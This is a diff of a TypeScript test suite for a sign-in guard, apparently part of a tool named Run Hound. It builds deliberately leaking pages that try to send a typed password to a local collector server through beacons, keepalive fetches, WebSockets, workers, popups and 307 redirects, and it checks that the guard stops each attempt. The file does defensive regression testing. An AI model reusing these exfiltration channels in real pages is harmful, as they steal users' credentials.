@@ -1,93 +1,28 @@
-/**
- * signIn keeps the password on the sign-in page's origin (0.6.0 review; docs/v2-spec.md "Signing in" and "Sign-in:
- * two-step and sessionStorage"): a request that would carry it to another origin, whatever sends it, is stopped before
- * it leaves the browser, and signing in then fails with "…sends the password to <origin>…" (or the request is stopped
- * and signing in goes on). Regression tests for the review's fixes (auth.ts stopUnrouted and carriesPassword):
- * - requests Playwright's routes never see: an unload beacon, a keepalive fetch, fetchLater and an image sent from a
- *   pagehide handler, and a form POST answered with a 307 (the browser re-sends the body to wherever it points);
- * - WebSockets: the password in the handshake's address, or in a message on a socket opened before it was typed;
- * - the password in an address's user name and password (http://u:<password>@host/, answered on a 401 challenge);
- * - the password JSON-escaped and then percent-encoded (`data=` + encodeURIComponent(JSON.stringify(…))), in a body and
- *   in a query;
- * - a common password ("demo") that is in many addresses still signs in: nothing is read before it is typed, only a
- *   whole path segment counts, and the Referer's host name is never read.
- *
- * Round 2 of the 0.6.0 review adds:
- * - the password in a cross-origin iframe's address, an EventSource's address and a top-level navigation's address;
- * - a sign-in form with target=_blank whose POST is answered with a 307 to the other origin: the new tab's redirect hop
- *   is sent before Playwright reports the tab, so only a tab held before it runs (guardSignInBrowser) stops it;
- * - a service worker registered from the sign-in origin (the context blocks service workers);
- * - speculation-rules prefetches the in-page strip used to miss (a rules script nested below <body>, one whose type is
- *   changed after it was inserted) and a Speculation-Rules response header (dropped by guardSignInBrowser);
- * - a page that closes its own tab with a pagehide send;
- * - a strong password in a same-origin request's address (stopped), while a weak one is stopped in a navigation's
- *   query, and in a script's request only under a key that names a password (?password=, &pwd=; ?user=demo goes);
- * - a weak password inside a longer JSON string or a Basic header's value on another origin (not a leak: signs in);
- * - a popup the landing page opens while Run Hound's sessionStorage probe is being opened (its redirect hop is stopped);
- * - workers that run even though the page's Worker/SharedWorker constructors were not replaced: a dedicated worker stays
- *   paused (stopUnrouted) and a shared worker is closed (guardSignInBrowser) before either runs.
- *
- * Round 3 adds:
- * - the password inside a path segment with other characters around it (/steal/<password>x, /log-<password>-end.gif),
- *   on another origin: a strong password is looked for anywhere in the path, a weak one only as a whole segment;
- * - the password requested as a WebSocket subprotocol (new WebSocket(url, [password]): the handshake's
- *   Sec-WebSocket-Protocol header), with a password that is a valid subprotocol token (TOKEN_SAFE); a subprotocol that
- *   isn't the password still connects.
- *
- * The whole suite's load (0.6.0) adds:
- * - tabs a page opens while this process is held (GET /stall answers, then holds it), so the browser has shown each
- *   before Run Hound or Playwright hears of it: Run Hound closed such a tab before Playwright had let it go, the
- *   renderer the tab shares with the sign-in page stayed paused, and signIn never returned.
- *
- * Each leaking page is first driven by hand in a plain browser (`plain`, one no signIn ever uses, so a guard a failed
- * signIn left behind can't stop the leak), which shows the leak reaches the other origin: so each signIn test fails
- * only for signIn's reasons. Each page also reports, to its own origin, that it tried (a synchronous XHR before a
- * request that gets stopped, so the report is in before signIn fails; a beacon from pagehide, where a synchronous XHR
- * isn't allowed). What must happen is waited for as it happens (the collector's receipt, the report's arrival, a
- * request), never for a set time; only what must not happen gets a set time to show up (settle).
- *
- * The other origin is `collector`: an HTTP server on another port that records every request, speaks enough of the
- * WebSocket protocol to record handshakes and text messages, answers CORS preflights, and answers /auth with a Basic
- * challenge.
- */
+// signIn keeps the password on the sign-in page's origin (0.6.0 review; docs/v2-spec.md "Signing in", "Sign-in: two-step and sessionStorage"): a request that would carry it to another origin is stopped before it leaves the browser (auth.ts stopUnrouted, carriesPassword) — pagehide / keepalive / fetchLater, 307 re-post, WebSocket handshake and messages, userinfo, JSON-escaped percent-encoded in body and query; round 2: cross-origin iframe / EventSource / navigation addresses, target=_blank + 307 to a new tab (held by guardSignInBrowser), service-worker registration, speculation-rules (script nested below <body> or type changed) and Speculation-Rules header, pagehide self-close, strong password in same-origin address (weak only in navigation query and under a password-named key), weak password inside JSON or Basic header on another origin (not a leak), popup while the sessionStorage probe opens, dedicated / shared worker; round 3: password inside a path segment with chars around it (strong anywhere, weak only as whole segment), WebSocket subprotocol Sec-WebSocket-Protocol with a TOKEN_SAFE password; load: a tab a page opens while this process holds /stall, before Playwright hears of it. Each leak is first driven by hand in a plain browser (so a guard a failed signIn left behind can't stop it); what must happen is waited for as it happens (collector receipt, report, request), only what must not gets SETTLE_MS.
 import { createHash } from "node:crypto";
 import { createServer, type IncomingMessage, type Server } from "node:http";
 import type { AddressInfo, Socket } from "node:net";
 import { chromium, type Browser } from "playwright";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
-import { closeBrowser, getBrowser } from "../../test-support/harness.js";
-import { json, startFixtureServer, type FixtureServer } from "../../test-support/server.js";
-import type { TestAccount } from "../interfaces/accounts.js";
-import { guardSignInBrowser, signIn, SignInError, stopUnrouted, type SignedIn } from "./auth.js";
+import { closeBrowser, getBrowser } from "../../../../test-support/harness.js";
+import { json, startFixtureServer, type FixtureServer } from "../../../../test-support/server.js";
+import type { TestAccount } from "../../../../src/interfaces/accounts.js";
+import { guardSignInBrowser, signIn, SignInError, stopUnrouted, type SignedIn } from "../../../../src/engine/auth.js";
 
 const EMAIL = "someone@example.test";
-/**
- * Every character a form body, a JSON body and an address encode their own way: a space, a quote and a backslash (JSON
- * escapes both), ( ) ! ~ (encodeURIComponent keeps them, a form body doesn't), @ (userinfo).
- */
+// Every character a form body, a JSON body and an address encode their own way: a space, a quote and a backslash (JSON escapes both), ( ) ! ~ (encodeURIComponent keeps them, a form body doesn't), @ (userinfo).
 const PASSWORD = `q"uo\\te (pw)!~@7391`;
-/** A common password, in many an address: it must still sign in (only a request that carries it is stopped). */
+// A common password, in many an address: it must still sign in (only a request that carries it is stopped).
 const COMMON = "demo";
-/**
- * A short, all-word-character password that is a substring of a longer token ("latest") an app puts in another
- * origin's address: it is not a leak, so sign-in must still succeed (0.6.0 review, `includesNeedle`'s token boundary).
- */
+// A short, all-word-character password that is a substring of a longer token ("latest") an app puts in another origin's address: not a leak, so sign-in must still succeed (0.6.0 review, `includesNeedle`'s token boundary).
 const WEAK_SUBSTRING = "test";
-/**
- * A strong password that is a valid WebSocket subprotocol token (RFC 6455: letters and digits are token characters), so
- * a page can request it as one: `new WebSocket(url, [password])` sends it in the handshake's Sec-WebSocket-Protocol
- * header. PASSWORD has characters a subprotocol can't hold (the constructor throws on it), so the LEAKS pages can't.
- */
+// A strong password that is a valid WebSocket subprotocol token (RFC 6455: letters and digits are token characters), so a page can request it as one: `new WebSocket(url, [password])` sends it in the handshake's Sec-WebSocket-Protocol header. PASSWORD has characters a subprotocol can't hold (the constructor throws on it), so the LEAKS pages can't.
 const TOKEN_SAFE = "abc123XYZ789def";
-/**
- * A host the safety gate refuses (an identity provider on the internet, as far as the gate knows: REFUSED_SSO says it
- * is public). A browser launched with --host-resolver-rules sends it to 127.0.0.1, so whatever got through would reach
- * the collector and be recorded there.
- */
+// A host the safety gate refuses (an identity provider on the internet, as far as the gate knows: REFUSED_SSO says it is public). A browser launched with --host-resolver-rules sends it to 127.0.0.1, so whatever got through would reach the collector and be recorded there.
 const SSO_HOST = "sso.example.test";
 const REFUSED_SSO = { lookup: async (host: string) => (host === SSO_HOST ? ["93.184.216.34"] : ["127.0.0.1"]) };
 
-/** What the collector saw: an HTTP request, a WebSocket handshake, or a text message on a WebSocket. */
+// What the collector saw: an HTTP request, a WebSocket handshake, or a text message on a WebSocket.
 interface Seen {
   kind: "http" | "ws" | "ws-message";
   method: string;
@@ -99,15 +34,15 @@ interface Seen {
 interface Collector {
   url: string;
   seen: Seen[];
-  /** The first request `match` accepts, recorded already or when it arrives: the collector's receipt, not a poll. */
+  // The first request `match` accepts, recorded already or when it arrives: the collector's receipt, not a poll.
   received(match: (seen: Seen) => boolean): Promise<Seen>;
   close(): Promise<void>;
 }
 
-/** The WebSocket handshake's accept value (RFC 6455, 4.2.2). */
+// The WebSocket handshake's accept value (RFC 6455, 4.2.2).
 const acceptKey = (key: string) => createHash("sha1").update(`${key}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`).digest("base64");
 
-/** Reads the client's frames (always masked) from `socket` and records each text or binary message's payload. */
+// Reads the client's frames (always masked) from `socket` and records each text or binary message's payload.
 function readFrames(socket: Socket, onMessage: (text: string) => void): void {
   let buffer = Buffer.alloc(0);
   socket.on("data", (chunk: Buffer) => {
@@ -203,17 +138,14 @@ async function startCollector(): Promise<Collector> {
 }
 
 let browser: Browser;
-/**
- * A browser Run Hound never signs in with, for the "by hand" controls: a guard left attached to `browser` by a signIn
- * that never returned (it checks every request of the browser) can't stop the leak a control must show.
- */
+// A browser Run Hound never signs in with, for the "by hand" controls: a guard left attached to `browser` by a signIn that never returned (it checks every request of the browser) can't stop the leak a control must show.
 let plain: Browser;
-/** The sign-in page's origin. */
+// The sign-in page's origin.
 let site: FixtureServer;
-/** Another origin, where the password must never arrive. */
+// Another origin, where the password must never arrive.
 let collector: Collector;
 
-/** decodeURIComponent with "+" as a space, as many times as it changes something; the text as it is when malformed. */
+// decodeURIComponent with "+" as a space, as many times as it changes something; the text as it is when malformed.
 function decodedFully(text: string): string {
   let out = text;
   for (let i = 0; i < 3; i++) {
@@ -229,7 +161,7 @@ function decodedFully(text: string): string {
   return out;
 }
 
-/** True when `text` holds `secret`: raw, percent-decoded, JSON-escaped, or in a Basic header. */
+// True when `text` holds `secret`: raw, percent-decoded, JSON-escaped, or in a Basic header.
 function holds(text: string, secret: string): boolean {
   const escaped = JSON.stringify(secret).slice(1, -1);
   const views = [text, decodedFully(text)];
@@ -238,35 +170,32 @@ function holds(text: string, secret: string): boolean {
   return views.some((v) => v.includes(secret) || v.includes(escaped));
 }
 
-/** Whether what the collector saw carries `secret`: in its address, its body or any header. */
+// Whether what the collector saw carries `secret`: in its address, its body or any header.
 const carrying =
   (secret = PASSWORD) =>
   (s: Seen): boolean =>
     [s.url, s.body, ...Object.values(s.headers).flat().filter((v): v is string => typeof v === "string")].some((t) => holds(t, secret));
 
-/** What reached the collector carrying `secret`, as "<kind> <method> <url>". */
+// What reached the collector carrying `secret`, as "<kind> <method> <url>".
 function leaks(secret = PASSWORD): string[] {
   return collector.seen.filter(carrying(secret)).map((s) => `${s.kind} ${s.method} ${s.url}`);
 }
 
-/** The attempts the pages reported to their own origin (`what` of /api/attempted?what=…), in order. */
+// The attempts the pages reported to their own origin (`what` of /api/attempted?what=…), in order.
 function attempts(): string[] {
   return site.requests.filter((r) => r.url.startsWith("/api/attempted?")).map((r) => new URL(r.url, "http://x").searchParams.get("what") ?? "");
 }
 
-/** Waiting for a report of an attempt (see attempted); resolved by the /api/attempted route when it comes in. */
+// Waiting for a report of an attempt (see attempted); resolved by the /api/attempted route when it comes in.
 const attemptWaiters = new Set<{ what: string; resolve: () => void }>();
 
-/** Resolves once the page has reported to its own origin that it tried `what`: already, or when the report comes in. */
+// Resolves once the page has reported to its own origin that it tried `what`: already, or when the report comes in.
 function attempted(what: string): Promise<void> {
   if (attempts().includes(what)) return Promise.resolve();
   return new Promise((resolve) => attemptWaiters.add({ what, resolve }));
 }
 
-/**
- * `event` (a receipt, a report, a request), or a failure that says what never happened. The bound only ends a wait
- * that failed, before the test's own timeout does so without saying why; nothing waits for it when the event comes.
- */
+// `event` (a receipt, a report, a request), or a failure that says what never happened. The bound only ends a wait that failed, before the test's own timeout does so without saying why; nothing waits for it when the event comes.
 function soon<T>(event: Promise<T>, never: string): Promise<T> {
   let timer: NodeJS.Timeout | undefined;
   const failed = new Promise<never>((_, reject) => {
@@ -277,15 +206,7 @@ function soon<T>(event: Promise<T>, never: string): Promise<T> {
 
 const shell = (title: string, body: string) => `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>${title}</title></head><body><main>${body}</main></body></html>`;
 
-/**
- * A sign-in page (email, password, Sign in) whose submit posts both to /api/login and, once signed in, goes to /home.
- * `script` sets the page's hooks on LEAK: onLoad(), onSubmit(pw) (before the sign-in request), signedIn(pw) (after it
- * succeeded, before leaving), next(pw) (where to go instead of /home) and delay (ms before leaving). C is the
- * collector's address, W the same as ws://, and tried(what) reports an attempt to the page's own origin (a beacon, so
- * it gets out of a page being left too). triedNow(what) reports it with a synchronous XHR, done before the next
- * statement: for the hooks whose next request gets stopped (signIn then fails and closes the page at once, and a beacon
- * queued just before may never be sent). Chromium forbids a synchronous XHR in pagehide, where tried is used.
- */
+// A sign-in page (email, password, Sign in) whose submit posts both to /api/login and, once signed in, goes to /home. `script` sets the page's hooks on LEAK: onLoad(), onSubmit(pw) (before the sign-in request), signedIn(pw) (after it succeeded, before leaving), next(pw) (where to go instead of /home) and delay (ms before leaving). C is the collector's address, W the same as ws://, and tried(what) reports an attempt to the page's own origin (a beacon, so it gets out of a page being left too). triedNow(what) reports it with a synchronous XHR, done before the next statement: for the hooks whose next request gets stopped (signIn then fails and closes the page at once, and a beacon queued just before may never be sent). Chromium forbids a synchronous XHR in pagehide, where tried is used.
 function signInPage(script: string, formAttributes = ""): string {
   return shell(
     "Sign in",
@@ -317,10 +238,7 @@ if (!form.getAttribute("action")) form.addEventListener("submit", function (e) {
   );
 }
 
-/**
- * A two-step sign-in form (0.6.0): the email and Continue; the first submit shows the password row (the page's own
- * script), the second is the browser's own form POST to `action`, email and password in the body.
- */
+// A two-step sign-in form (0.6.0): the email and Continue; the first submit shows the password row (the page's own script), the second is the browser's own form POST to `action`, email and password in the body.
 function twoStepPage(action: string): string {
   return shell(
     "Sign in",
@@ -342,14 +260,7 @@ form.addEventListener("submit", function (e) {
   );
 }
 
-/**
- * A sign-in page that, once the password is entered and /api/login answers 200, runs `exfil` (a statement with `pw`,
- * `C` the collector's address and `W` the same as ws://, `tried(what)` a same-origin beacon, `triedNow(what)` the same
- * as a synchronous XHR) and then removes the form without navigating — so the page stays alive for a channel that would
- * carry the password out (a worker, a popup, a prefetch), and sign-in still succeeds (the password field is gone). Used
- * for the 0.6.0-review channels the routes never see: with the guarded context those channels are closed, so the
- * password never reaches the collector. With `finish` "when-done", the form stays until `exfil` calls done().
- */
+// A sign-in page that, once the password is entered and /api/login answers 200, runs `exfil` (a statement with `pw`, `C` the collector's address and `W` the same as ws://, `tried(what)` a same-origin beacon, `triedNow(what)` the same as a synchronous XHR) and then removes the form without navigating — so the page stays alive for a channel that would carry the password out (a worker, a popup, a prefetch), and sign-in still succeeds (the password field is gone). Used for the 0.6.0-review channels the routes never see: with the guarded context those channels are closed, so the password never reaches the collector. With `finish` "when-done", the form stays until `exfil` calls done().
 function exfilPage(exfil: string, finish: "now" | "when-done" = "now"): string {
   return shell(
     "Sign in",
@@ -377,7 +288,7 @@ document.getElementById("f").addEventListener("submit", function (e) {
   );
 }
 
-/** The page /bounce-tab that a popup opens: it reads the password from window.name and POSTs it to /bounce (a 307). */
+// The page /bounce-tab that a popup opens: it reads the password from window.name and POSTs it to /bounce (a 307).
 const bounceTabPage = () =>
   shell(
     "Bounce",
@@ -385,7 +296,7 @@ const bounceTabPage = () =>
 <script>document.querySelector("[name=password]").value = window.name; document.getElementById("bf").submit();</script>`,
   );
 
-/** The exfil statements for the 0.6.0-review channels (each reports its attempt with tried, then tries to leak `pw`). */
+// The exfil statements for the 0.6.0-review channels (each reports its attempt with tried, then tries to leak `pw`).
 const CHANNELS = {
   "worker-shared": `tried("worker-shared"); var s = new SharedWorker("/exfil-shared-worker.js"); s.port.start(); s.port.postMessage(pw);`,
   "worker-ws": `tried("worker-ws"); var w = new Worker("/exfil-dedicated-worker.js"); w.postMessage(pw);`,
@@ -403,20 +314,20 @@ const CHANNELS = {
   "service-worker": `tried("service-worker"); navigator.serviceWorker.register("/exfil-sw.js").then(function () { return navigator.serviceWorker.ready; }).then(function (reg) { reg.active.postMessage(pw); });`,
 } as const;
 
-/** One way a page tries to get the password to the collector. */
+// One way a page tries to get the password to the collector.
 interface Leak {
   name: string;
-  /** What the page does, in the test's title. */
+  // What the page does, in the test's title.
   does: string;
   script: string;
   formAttributes?: string;
-  /** The page doesn't move on when submitted (the leak goes out from another tab): by hand, wait for the collector. */
+  // The page doesn't move on when submitted (the leak goes out from another tab): by hand, wait for the collector.
   stays?: true;
-  /** What signIn says when it fails, instead of "…sends the password to <collector>…". */
+  // What signIn says when it fails, instead of "…sends the password to <collector>…".
   says?: RegExp;
 }
 
-/** Sends `send` (a statement using pw) from a pagehide handler registered once signed in, after reporting the attempt. */
+// Sends `send` (a statement using pw) from a pagehide handler registered once signed in, after reporting the attempt.
 const onPagehide = (name: string, send: string) =>
   `LEAK.signedIn = function (pw) { addEventListener("pagehide", function () { tried(${JSON.stringify(name)}); ${send} }); };`;
 
@@ -512,17 +423,12 @@ LEAK.onSubmit = function (pw) { triedNow("ws-message"); ws.send(JSON.stringify({
   },
 ];
 
-/** The password the sign-in endpoint received last: a page the app's own server builds with it (the probe-race tab). */
+// The password the sign-in endpoint received last: a page the app's own server builds with it (the probe-race tab).
 let lastPassword = "";
 
 const escapeHtml = (text: string) => text.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;");
 
-/**
- * The probe race (0.6.0 review): the sign-in page moves on to a landing page on another origin (localhost instead of
- * 127.0.0.1, same server), so Run Hound opens its sessionStorage probe as a popup of the landing page. The landing
- * page has replaced window.open: before the probe, it opens its own tab on the sign-in origin, which posts the
- * password (the app's server put it in the page) to /bounce, a 307 to the collector.
- */
+// The probe race (0.6.0 review): the sign-in page moves on to a landing page on another origin (localhost instead of 127.0.0.1, same server), so Run Hound opens its sessionStorage probe as a popup of the landing page. The landing page has replaced window.open: before the probe, it opens its own tab on the sign-in origin, which posts the password (the app's server put it in the page) to /bounce, a 307 to the collector.
 const probeRaceLanding = () =>
   shell(
     "Home",
@@ -534,20 +440,15 @@ window.open = function () { realOpen.call(window, signInOrigin + "/probe-race/bo
 </script>`,
   );
 
-/** A page that, once signed in, sends the password from pagehide and closes its own tab (window.close). */
+// A page that, once signed in, sends the password from pagehide and closes its own tab (window.close).
 const SELF_CLOSE = `tried("self-close"); addEventListener("pagehide", function () { navigator.sendBeacon(C + "/closed", pw); }); window.close();`;
 
-/** How long GET /stall holds this process after it has answered. */
+// How long GET /stall holds this process after it has answered.
 const STALL_MS = 1_000;
-/** How many tabs /channel/popup-stalled opens, one after each /stall. */
+// How many tabs /channel/popup-stalled opens, one after each /stall.
 const STALLED_ROUNDS = 3;
 
-/**
- * The popup channel (CHANNELS.popup: a tab that POSTs the password to /bounce, a 307 to the collector), opened
- * STALLED_ROUNDS times, each right after GET /stall has answered and while it holds this process (signIn, Playwright
- * and both servers run here): the browser creates and shows the tab before Run Hound or Playwright hears of it, the
- * order a loaded machine makes by chance (0.6.0, the whole suite). The form stays until the last round (done()).
- */
+// The popup channel (CHANNELS.popup: a tab that POSTs the password to /bounce, a 307 to the collector), opened STALLED_ROUNDS times, each right after GET /stall has answered and while it holds this process (signIn, Playwright and both servers run here): the browser creates and shows the tab before Run Hound or Playwright hears of it, the order a loaded machine makes by chance (0.6.0, the whole suite). The form stays until the last round (done()).
 const STALLED_POPUPS = `tried("popup-stalled"); var round = 0; (function next() {
   if (round++ >= ${STALLED_ROUNDS}) return done();
   fetch("/stall").then(function () { var win = window.open("/bounce-tab", "_blank"); if (win) win.name = pw; setTimeout(next, 50); });
@@ -709,10 +610,7 @@ function reset(): void {
   collector.seen.length = 0;
 }
 
-/**
- * Signs in by hand in a plain browser (no Run Hound): what a person's browser would do on `path`. A page that `stays`
- * (its leak goes out from another tab) is waited on until the collector receives something carrying the password.
- */
+// Signs in by hand in a plain browser (no Run Hound): what a person's browser would do on `path`. A page that `stays` (its leak goes out from another tab) is waited on until the collector receives something carrying the password.
 async function signInByHand(path: string, stays = false, password = PASSWORD): Promise<void> {
   const context = await plain.newContext();
   try {
@@ -729,13 +627,13 @@ async function signInByHand(path: string, stays = false, password = PASSWORD): P
   }
 }
 
-/** Resolves once the collector has received something carrying `secret` (a control's leak), else says where from. */
+// Resolves once the collector has received something carrying `secret` (a control's leak), else says where from.
 const leaked = (from: string, secret = PASSWORD) => soon(collector.received(carrying(secret)), `nothing carrying the password reached the collector from ${from}`);
 
-/** Resolves once the page has reported that it tried `what` (attempted), else says it never did. */
+// Resolves once the page has reported that it tried `what` (attempted), else says it never did.
 const reported = (what: string) => soon(attempted(what), `the page never reported that it tried "${what}"`);
 
-/** signIn's outcome: what it resolved with, or the SignInError it threw (anything else fails the test). */
+// signIn's outcome: what it resolved with, or the SignInError it threw (anything else fails the test).
 async function outcomeOf(promise: Promise<SignedIn>): Promise<SignedIn | SignInError> {
   const outcome = await promise.then(
     (signedIn) => signedIn,
@@ -745,7 +643,7 @@ async function outcomeOf(promise: Promise<SignedIn>): Promise<SignedIn | SignInE
   return outcome as SignedIn | SignInError;
 }
 
-/** The collector gets a moment for anything that is still on its way (a beacon queued by a page being left). */
+// The collector gets a moment for anything that is still on its way (a beacon queued by a page being left).
 const settle = () => new Promise((resolve) => setTimeout(resolve, 750));
 
 describe("the leaking pages, by hand (so the signIn tests below fail only for signIn's reasons)", () => {
@@ -794,7 +692,7 @@ describe("signIn with a common password", () => {
 });
 
 describe("signIn: a two-step password step redirected to a host the safety gate refuses", () => {
-  /** A browser that sends SSO_HOST to 127.0.0.1, so whatever reached it is recorded by the collector. */
+  // A browser that sends SSO_HOST to 127.0.0.1, so whatever reached it is recorded by the collector.
   let ssoBrowser: Browser;
 
   beforeAll(async () => {
@@ -838,7 +736,7 @@ describe("signIn: a two-step password step redirected to a host the safety gate 
   }
 });
 
-/** Signs in by hand on a channel page in a plain browser (no Run Hound) and waits for the collector to receive the password. */
+// Signs in by hand on a channel page in a plain browser (no Run Hound) and waits for the collector to receive the password.
 async function channelReachesByHand(path: string): Promise<void> {
   const context = await plain.newContext();
   try {
@@ -1093,7 +991,7 @@ describe("signIn: the password requested as a WebSocket subprotocol (0.6.0 revie
 });
 
 describe("the protocol-level worker layer, without the page's constructor override (0.6.0 review, round 2)", () => {
-  /** A plain context (no SIGN_IN_HARDENING init script): the page's Worker and SharedWorker are the browser's own. */
+  // A plain context (no SIGN_IN_HARDENING init script): the page's Worker and SharedWorker are the browser's own.
   it("stopUnrouted: a dedicated worker the page starts never runs, and is reported", async () => {
     reset();
     const context = await browser.newContext();
